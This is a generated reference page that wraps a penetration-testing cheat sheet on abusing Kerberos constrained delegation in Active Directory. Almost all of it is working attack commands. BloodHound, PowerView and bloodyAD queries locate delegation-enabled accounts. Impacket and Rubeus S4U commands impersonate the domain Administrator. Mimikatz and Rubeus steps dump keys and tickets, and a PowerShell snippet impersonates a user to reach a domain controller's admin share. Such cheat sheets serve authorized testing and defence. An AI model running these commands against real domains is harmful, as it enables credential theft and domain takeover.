---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kerberos Delegation - Constrained Delegation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-kerberos-delegation-constrained` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-constrained.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberos Delegation - Constrained Delegation](../../topics/active-directory/kerberos-delegation-constrained-delegation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-kerberos-delegation-constrained |
| name | Kerberos Delegation - Constrained Delegation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/kerberos-delegation-constrained.md |

## Preserved Source Material

````yaml
_body: "# Kerberos Delegation - Constrained Delegation\n\n> Kerberos Constrained Delegation (KCD) is a security feature in\
  \ Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources\
  \ on behalf of that user or service.\n\n## Identify a Constrained Delegation\n\n* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer)\
  \ RETURN p`\n* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`\n* Native\n\
  \n  ```powershell\n  Get-DomainComputer -TrustedToAuth | select -exp dnshostname\n  Get-DomainComputer previous_result |\
  \ select -exp msds-AllowedToDelegateTo\n  ```\n\n* bloodyAD:\n\n  ```ps1\n  bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab\
  \ --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))'\
  \ --attr sAMAccountName,msds-allowedtodelegateto\n  ```\n\n## Exploit the Constrained Delegation\n\n* Impacket\n\n  ```ps1\n\
  \  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10\n  ```\n\n* Rubeus:\
  \ S4U2 attack (S4U2self + S4U2proxy)\n\n  ```ps1\n  # with a password\n  Rubeus.exe s4u /nowrap /msdsspn:\"time/target.local\"\
  \ /altservice:cifs /impersonateuser:\"administrator\" /domain:\"domain\" /user:\"user\" /password:\"password\"\n\n  # with\
  \ a NT hash\n  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com\
  \ /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt\n  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH\
  \ /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt\n  dir\
  \ \\\\dc.domain.com\\c$\n  ```\n\n* Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the \"Administrator\"\
  \n\n  ```ps1\n  # Dump ticket\n  Rubeus.exe tgtdeleg /nowrap\n  Rubeus.exe triage\n  Rubeus.exe dump /luid:0x12d1f7\n\n\
  \  # Create a ticket\n  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA==\
  \ /ptt\n  ```\n\n* Rubeus : using aes256 keys\n\n  ```ps1\n  # Get aes256 keys of the machine account\n  privilege::debug\n\
  \  token::elevate\n  sekurlsa::ekeys\n\n  # Create a ticket\n  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local\
  \ /user:win10x64$ /aes256:4b55f...fd82 /ptt\n  ```\n\n## Impersonate a domain user on a resource\n\nRequire:\n\n* SYSTEM\
  \ level privileges on a machine configured with constrained delegation\n\n```ps1\nPS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')\
  \ | out-null\nPS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')\nPS> $idToImpersonate.Impersonate()\n\
  PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name\nPS> ls \\\\dc01.offense.local\\c$\n```"
_relative_path: active-directory/kerberos-delegation-constrained.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-constrained.md
````
